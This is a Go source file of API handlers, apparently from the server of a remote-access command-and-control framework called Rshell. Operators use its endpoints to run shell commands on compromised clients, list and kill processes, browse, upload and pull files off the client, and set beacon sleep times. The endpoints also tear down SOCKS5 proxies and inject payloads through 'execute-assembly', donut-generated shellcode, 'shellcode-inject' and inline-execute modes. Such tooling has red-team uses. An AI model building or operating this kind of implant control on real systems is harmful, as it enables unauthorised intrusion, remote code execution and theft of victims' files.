package api

import (
	"Rshell/pkg/command"
	"Rshell/pkg/database"
	"Rshell/pkg/godonut"
	"Rshell/pkg/logger"
	"Rshell/pkg/proxy"
	"Rshell/pkg/response"
	"Rshell/pkg/sendcommand"
	"Rshell/pkg/utils"
	"context"
	"encoding/binary"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

func GetClients(c *gin.Context) {
	var clientGet struct {
		Page     int `form:"page"`
		PageSize int `form:"page_size"`
	}
	if err := c.ShouldBindQuery(&clientGet); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	var clientData []database.Clients
	database.Engine.Find(&clientData)
	clientData2 := utils.Paginate(clientData, clientGet.Page, clientGet.PageSize)
	response.OK(c, gin.H{
		"list":  clientData2,
		"total": len(clientData),
	})
}
func SendCommands(c *gin.Context) {
	var commands struct {
		Uid     string `form:"uid"`
		Command string `json:"command"`
	}
	if err := c.ShouldBindJSON(&commands); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	var shellHistory database.Shell
	database.Engine.Where("uid = ?", commands.Uid).Get(&shellHistory)
	shellHistory.ShellContent = shellHistory.ShellContent + "$ " + commands.Command + "\n"
	database.Engine.Where("uid = ?", commands.Uid).Update(&shellHistory)

	sendcommand.SendCommand(commands.Uid, commands.Command)

	response.OK(c, shellHistory.ShellContent)
}

func GetShellContent(c *gin.Context) {
	var shellContent struct {
		Uid string `form:"uid"`
	}
	if err := c.ShouldBindQuery(&shellContent); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	var shell database.Shell
	database.Engine.Where("uid = ?", shellContent.Uid).Get(&shell)
	response.OK(c, shell.ShellContent)
	//var body struct {
	//	Uid string `form:"uid"`
	//}
	//
	//if err := c.ShouldBindQuery(&body); err != nil {
	//	c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	//}
	//fmt.Println(body.Uid)
	//var shell database.Shell
	//database.Engine.Where("uid = ?", body.Uid).Get(&shell)
	//c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": shell.ShellContent})
}
func GetPidList(c *gin.Context) {
	var shellContent struct {
		Uid string `form:"uid"`
	}
	if err := c.ShouldBindQuery(&shellContent); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	// 创建 UID 对应的通道队列
	queue := command.VarPidQueue.GetOrCreateQueue(shellContent.Uid)

	sendcommand.SendCommand(shellContent.Uid, "ps")

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case pids := <-queue:
		pidStruct := utils.ParsePid(pids)
		response.OK(c, pidStruct)
	case <-ctx.Done():
		response.Timeout(c)
	}
}
func KillPid(c *gin.Context) {
	var pidBody struct {
		Uid string `json:"uid"`
		Pid string `json:"pid"`
	}
	if err := c.ShouldBindJSON(&pidBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	sendcommand.SendCommand(pidBody.Uid, "kill "+pidBody.Pid)
	response.OK(c, "killed")
}
func FileBrowse(c *gin.Context) {
	var fileBody struct {
		Uid     string `json:"uid"`
		DirPath string `json:"dirPath"`
	}
	if err := c.ShouldBindJSON(&fileBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	if fileBody.DirPath == "" {
		response.BadRequest(c, "dirPath is empty")
		return
	}

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(fileBody.Uid)
	if strings.HasSuffix(fileBody.DirPath, ":") {
		fileBody.DirPath += "/"
	}
	//fmt.Println("dirPath:", fileBody.DirPath)
	sendcommand.SendCommand(fileBody.Uid, "filebrowse "+fileBody.DirPath)

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(fileBody.Uid, fileBrowseStr)
		response.OK(c, fileTree)
	case <-ctx.Done():
		response.Timeout(c)
	}

}
func FileDelete(c *gin.Context) {
	var fileBody struct {
		Uid      string `json:"uid"`
		FilePath string `json:"filePath"`
	}
	if err := c.ShouldBindJSON(&fileBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(fileBody.Uid)

	var dirPath string
	lastSlashIndex := strings.LastIndex(fileBody.FilePath, "/")
	if lastSlashIndex != -1 {
		dirPath = fileBody.FilePath[:lastSlashIndex+1]
	}
	sendcommand.SendCommand(fileBody.Uid, "filebrowse "+dirPath)

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(fileBody.Uid, fileBrowseStr)
		response.OK(c, fileTree)
	case <-ctx.Done():
		response.Timeout(c)
	}
}
func MakeDir(c *gin.Context) {
	var dirBody struct {
		Uid     string `json:"uid"`
		DirPath string `json:"dirPath"`
	}
	if err := c.ShouldBindJSON(&dirBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(dirBody.Uid)

	var dirPath string
	lastSlashIndex := strings.LastIndex(dirBody.DirPath, "/")
	if lastSlashIndex != -1 {
		dirPath = dirBody.DirPath[:lastSlashIndex+1]
	}
	sendcommand.SendCommand(dirBody.Uid, "filebrowse "+dirPath)

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(dirBody.Uid, fileBrowseStr)
		response.OK(c, fileTree)
	case <-ctx.Done():
		response.Timeout(c)
	}
}
func FileUpload(c *gin.Context) {
	file, _ := c.FormFile("file")
	if file == nil {
		response.BadRequest(c, "No file uploaded")
		return
	}
	// 打开上传的文件
	src, err := file.Open()
	if err != nil {
		response.InternalError(c)
		return
	}
	defer src.Close()

	// 读取文件内容到字节数组
	fileBytes, err := io.ReadAll(src)
	if err != nil {
		response.InternalError(c)
		return
	}

	// 获取其他表单字段
	uid := c.PostForm("uid")
	uploadPath := c.PostForm("uploadPath")

	uploadPathBytes := []byte(uploadPath)
	uploadPathLen := len(uploadPathBytes)
	uploadPathLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(uploadPathLenBytes, uint32(uploadPathLen))
	fileBytesArray := utils.SplitByteArray(fileBytes, 1040500)
	go func() {
		if len(fileBytesArray) == 0 {
			return
		}
		cmd := utils.BytesCombine(uploadPathLenBytes, uploadPathBytes, fileBytesArray[0])
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.UploadStart))
		byteToSend := append(cmdTypeBytes, cmd...)
		sendcommand.SendCommandBytes(uid, byteToSend)

		for _, filebytes := range fileBytesArray[1:] {
			cmdLoop := utils.BytesCombine(uploadPathLenBytes, uploadPathBytes, filebytes)
			cmdTypeBytesLoop := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytesLoop, uint32(command.UploadLoop))
			byteToSendLoop := append(cmdTypeBytesLoop, cmdLoop...)
			sendcommand.SendCommandBytes(uid, byteToSendLoop)
		}
	}()
	response.OK(c, nil)
}
func GetNote(c *gin.Context) {
	var noteBody struct {
		Uid string `form:"uid"`
	}
	if err := c.ShouldBindQuery(&noteBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	var Note database.Notes
	database.Engine.Where("uid = ?", noteBody.Uid).Get(&Note)
	response.OK(c, Note.Note)
}
func SaveNote(c *gin.Context) {
	var noteBody struct {
		Uid         string `json:"uid"`
		NoteContent string `json:"noteContent"`
	}
	if err := c.ShouldBindJSON(&noteBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	var Note database.Notes
	database.Engine.Where("uid = ?", noteBody.Uid).Get(&Note)
	Note.Note = noteBody.NoteContent
	database.Engine.Where("uid = ?", noteBody.Uid).Update(&Note)
	response.OK(c, nil)
}
func DownloadFile(c *gin.Context) {
	var fileBody struct {
		Uid      string `json:"uid"`
		FilePath string `json:"filePath"`
	}

	if err := c.ShouldBindJSON(&fileBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	// 验证输入参数
	if fileBody.Uid == "" || fileBody.FilePath == "" {
		response.BadRequest(c, "UID and file path are required")
		return
	}

	// 验证 UID 格式
	if strings.Contains(fileBody.Uid, "..") || strings.Contains(fileBody.Uid, "/") || strings.Contains(fileBody.Uid, "\\") {
		response.BadRequest(c, "Invalid UID format")
		return
	}

	// 验证文件路径基本安全性
	if fileBody.FilePath == "" || fileBody.FilePath == "." || fileBody.FilePath == ".." {
		response.BadRequest(c, "Invalid file path")
		return
	}

	// 使用安全路径创建下载目录
	downloadDir := filepath.Join("./Downloads", fileBody.Uid)

	// 确保下载目录存在
	if err := os.MkdirAll(downloadDir, 0755); err != nil {
		logger.Error("Failed to create download directory: %v", err)
		response.InternalError(c)
		return
	}

	// 获取安全的文件名用于数据库存储
	safeFileName := filepath.Base(fileBody.FilePath)
	safeFileName = strings.ReplaceAll(safeFileName, "/", "")
	safeFileName = strings.ReplaceAll(safeFileName, "\\", "")

	if safeFileName == "" {
		response.BadRequest(c, "Invalid file name")
		return
	}

	// 数据库操作
	var fileDownloads database.Downloads
	exist, err := database.Engine.Where("uid = ? AND file_path = ?", fileBody.Uid, fileBody.FilePath).Get(&fileDownloads)
	if err != nil {
		logger.Error("Database query failed: %v", err)
		response.InternalError(c)
		return
	}

	if !exist {
		// 插入新记录
		downloadRecord := &database.Downloads{
			Uid:            fileBody.Uid,
			FileName:       safeFileName,
			FilePath:       fileBody.FilePath,
			FileSize:       0,
			DownloadedSize: 0,
		}
		if _, err := database.Engine.Insert(downloadRecord); err != nil {
			logger.Error("Failed to insert download record: %v", err)
			response.InternalError(c)
			return
		}
	} else {
		// 更新现有记录
		sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
		_, err := database.Engine.Exec(sql, 0, 0, fileBody.Uid, fileBody.FilePath)
		if err != nil {
			logger.Error("Failed to update download record: %v", err)
			response.InternalError(c)
			return
		}
	}

	// 发送下载命令
	sendcommand.SendCommand(fileBody.Uid, "download "+fileBody.FilePath)
	response.OK(c, nil)
}

type DownloadsInfo struct {
	FileName       string `json:"fileName"`
	FilePath       string `json:"filePath"`
	FileSize       string `json:"fileSize"`
	DownloadedPart string `json:"downloadPart"`
}

func GetDownloadsInfo(c *gin.Context) {
	var downloadBody struct {
		Uid string `form:"uid"`
	}
	if err := c.ShouldBindQuery(&downloadBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	var downloads []database.Downloads
	database.Engine.Where("uid = ?", downloadBody.Uid).Find(&downloads)
	var result []DownloadsInfo
	for _, download := range downloads {
		var tmpDownloadsInfo DownloadsInfo
		tmpDownloadsInfo.FileName = download.FileName
		tmpDownloadsInfo.FilePath = download.FilePath
		tmpDownloadsInfo.FileSize = utils.BytesToSize(strconv.Itoa(download.FileSize))
		if download.FileSize != 0 {
			tmpDownloadsInfo.DownloadedPart = strconv.Itoa(download.DownloadedSize * 100 / download.FileSize)
		} else {
			tmpDownloadsInfo.DownloadedPart = "0"
		}

		result = append(result, tmpDownloadsInfo)
	}
	response.OK(c, result)
}
func DownloadDownloadedFile(c *gin.Context) {
	var downloadBody struct {
		Uid      string `json:"uid"`
		FilePath string `json:"filePath"`
	}

	if err := c.ShouldBindJSON(&downloadBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	// 使用通用的安全路径函数验证文件路径
	fullPath, err := utils.GetSafeFilePath(downloadBody.Uid, downloadBody.FilePath)
	if err != nil {
		response.BadRequest(c, "Invalid file path")
		return
	}

	// 检查文件是否存在
	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		response.NotFound(c, "File not found")
		return
	}

	// 获取安全的文件名用于下载
	safeFileName := filepath.Base(downloadBody.FilePath)
	safeFileName = strings.ReplaceAll(safeFileName, "/", "")
	safeFileName = strings.ReplaceAll(safeFileName, "\\", "")

	// 设置响应头
	c.Header("Content-Description", "File Transfer")
	c.Header("Content-Transfer-Encoding", "binary")
	c.Header("Content-Disposition", "attachment; filename="+safeFileName)
	c.Header("Content-Type", "application/octet-stream")

	// 发送文件
	c.File(fullPath)
}
func ListDrives(c *gin.Context) {
	var drivesBody struct {
		Uid string `form:"uid"`
	}
	if err := c.ShouldBindQuery(&drivesBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	queue := command.VarDrivesQueue.GetOrCreateQueue(drivesBody.Uid)

	sendcommand.SendCommand(drivesBody.Uid, "drives")

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		//fmt.Println("fileBrowseStr", fileBrowseStr)
		fileTree := command.ParseDrives(drivesBody.Uid, fileBrowseStr)
		response.OK(c, fileTree)
	case <-ctx.Done():
		response.Timeout(c)
	}
}
func FetchFileContent(c *gin.Context) {
	var contentBody struct {
		Uid      string `json:"uid"`
		FilePath string `json:"path"`
	}
	if err := c.ShouldBindJSON(&contentBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	queue := command.VarFileContentQueue.GetOrCreateQueue(contentBody.Uid, contentBody.FilePath)

	sendcommand.SendCommand(contentBody.Uid, "filecontent "+contentBody.FilePath)

	// 创建一个 context 并设置超时
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileContent := <-queue:
		response.OK(c, fileContent)
	case <-ctx.Done():
		response.Timeout(c)
	}

}
func ExitClient(c *gin.Context) {
	var clientBody struct {
		Uid string `form:"uid"`
	}
	if err := c.ShouldBindQuery(&clientBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	sendcommand.SendCommand(clientBody.Uid, "exit")

	go func() {
		var client database.Clients
		database.Engine.Where("uid = ?", clientBody.Uid).Get(&client)
		duration, _ := time.ParseDuration(client.Sleep + "s")
		time.Sleep(duration)
		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Clients))
		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Downloads))
		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Notes))
		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Shell))
		var socks5 []database.Socks5
		database.Engine.Where("uid = ?", clientBody.Uid).Find(&socks5)
		for _, socks5i := range socks5 {
			if _, exists := proxy.Socks5Serve[socks5i.Socks5port]; exists {
				err := proxy.Socks5Serve[socks5i.Socks5port].Close()
				proxy.MuSocks5Serve.Lock()
				delete(proxy.Socks5Serve, socks5i.Socks5port)
				proxy.MuSocks5Serve.Unlock()
				if err != nil {
					logger.Error("Socks5 closed failed for uid %s", clientBody.Uid)
					return
				}
			}
		}
		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Socks5))
		delete(command.UidFileBrowser, clientBody.Uid)
	}()

	response.OK(c, nil)
}
func AddUidNote(c *gin.Context) {
	var noteBody struct {
		Uid  string `json:"uid"`
		Note string `json:"note"`
	}
	if err := c.ShouldBindJSON(&noteBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}

	database.Engine.Where("uid = ?", noteBody.Uid).Update(&database.Clients{Note: noteBody.Note})
	response.OK(c, nil)
}
func EditSleep(c *gin.Context) {
	var sleepBody struct {
		Uid   string `json:"uid"`
		Sleep string `json:"sleep"`
	}
	if err := c.ShouldBindJSON(&sleepBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	database.Engine.Where("uid = ?", sleepBody.Uid).Update(&database.Clients{Sleep: sleepBody.Sleep})
	sendcommand.SendCommand(sleepBody.Uid, "sleep "+sleepBody.Sleep)
	response.OK(c, nil)
}
func EditColor(c *gin.Context) {
	var colorBody struct {
		Uid   string `json:"uid"`
		Color string `json:"color"`
	}
	if err := c.ShouldBindJSON(&colorBody); err != nil {
		response.ValidationError(c, response.ParseValidationErrors(err))
		return
	}
	database.Engine.Where("uid = ?", colorBody.Uid).Update(&database.Clients{Color: colorBody.Color})
	response.OK(c, nil)
}
func ExecuteBin(c *gin.Context) {
	file, _ := c.FormFile("file")
	if file == nil {
		response.BadRequest(c, "No file uploaded")
		return
	}
	// 打开上传的文件
	src, err := file.Open()
	if err != nil {
		response.BadRequest(c, "Unable to open file")
		return
	}
	defer src.Close()

	// 读取文件内容到字节数组
	fileBytes, err := io.ReadAll(src)
	if err != nil {
		response.BadRequest(c, "Unable to read file")
		return
	}

	uid := c.PostForm("uid")
	args := c.PostForm("args")
	mode := c.PostForm("mode")

	var shellHistory database.Shell
	database.Engine.Where("uid = ?", uid).Get(&shellHistory)
	shellHistory.ShellContent = shellHistory.ShellContent + "$ " + mode + " " + file.Filename + " " + args + "\n"
	database.Engine.Where("uid = ?", uid).Update(&shellHistory)

	switch mode {
	case "execute-assembly":
		fileLength := len(fileBytes)
		fileLengthBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))

		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteAssembly))
		byteToSend = append(cmdTypeBytes, byteToSend...)
		sendcommand.SendCommandBytes(uid, byteToSend)
	case "inline-bin":
		var u database.Clients
		database.Engine.Where("uid = ?", uid).Get(&u)

		payload, err := godonut.GenShellcode(fileBytes, args, u.Arch)
		if err != nil {
			response.BadRequest(c, "Unable to generate shellcode")
			return
		}
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
		byteToSend := utils.BytesCombine(cmdTypeBytes, payload)
		sendcommand.SendCommandBytes(uid, byteToSend)
	case "shellcode-inject":
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
		byteToSend := utils.BytesCombine(cmdTypeBytes, fileBytes)
		sendcommand.SendCommandBytes(uid, byteToSend)
	case "inline-execute":
		fileLength := len(fileBytes)
		fileLengthBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))
		cmdTypeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineExecute))
		byteToSend = append(cmdTypeBytes, byteToSend...)
		sendcommand.SendCommandBytes(uid, byteToSend)
	}
	response.OK(c, nil)
}

func ExecuteLinuxScript(c *gin.Context) {
	file, _ := c.FormFile("file")
	if file == nil {
		response.BadRequest(c, "No file uploaded")
		return
	}
	// 打开上传的文件
	src, err := file.Open()
	if err != nil {
		response.BadRequest(c, "Unable to open file")
		return
	}
	defer src.Close()

	// 读取文件内容到字节数组
	fileBytes, err := io.ReadAll(src)
	if err != nil {
		response.BadRequest(c, "Unable to read file")
		return
	}

	uid := c.PostForm("uid")
	args := c.PostForm("args")

	var shellHistory database.Shell
	database.Engine.Where("uid = ?", uid).Get(&shellHistory)
	shellHistory.ShellContent = shellHistory.ShellContent + "$ " + "execute-linux-sh " + file.Filename + " " + args + "\n"
	database.Engine.Where("uid = ?", uid).Update(&shellHistory)

	// 获取客户端信息以检查操作系统架构
	// var client database.Clients
	// database.Engine.Where("uid = ?", uid).Get(&client)

	// 检查客户端操作系统是否为Windows
	// if client.Os == "Windows" || client.Os == "windows" {
	// 	// Windows客户端返回不支持消息
	// 	unsupportedMsg := "[!] 当前客户端为Windows架构，不支持Linux脚本执行\n"
	// 	shellHistory.ShellContent = shellHistory.ShellContent + unsupportedMsg
	// 	database.Engine.Where("uid = ?", uid).Update(&shellHistory)
	// 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
	// 	return
	// }

	// 构建脚本内容消息
	fileLength := len(fileBytes)
	fileLengthBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
	byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))

	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxScript))
	byteToSend = append(cmdTypeBytes, byteToSend...)
	sendcommand.SendCommandBytes(uid, byteToSend)

	response.OK(c, nil)
}
